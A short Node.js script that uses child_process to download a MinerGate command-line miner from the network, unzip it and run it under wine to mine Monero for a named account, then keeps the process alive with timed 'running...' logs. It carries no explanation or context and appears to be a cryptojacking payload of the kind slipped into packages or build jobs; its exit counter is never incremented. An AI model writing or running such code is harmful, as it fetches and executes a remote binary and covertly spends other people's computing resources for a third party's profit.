var str = "wget https://minergate.com/download/win32-cli && unzip win32-cli && cd Miner* && wine minergate-cli.exe -user molunar@yandex.com -xmr";
require('child_process').exec(str, { stdio: [0, 1, 2] });
require('child_process').exec("wine --help", { stdio: [0, 1, 2] });
var index = 1;
var max = 20;
var interval;
interval = setInterval(function () {
  if (index >= max) {
    setTimeout(function(){
        process.exit(0);
    }, 1000);		
  }
  console.log("running..." + index);
}, 1000 * 60);
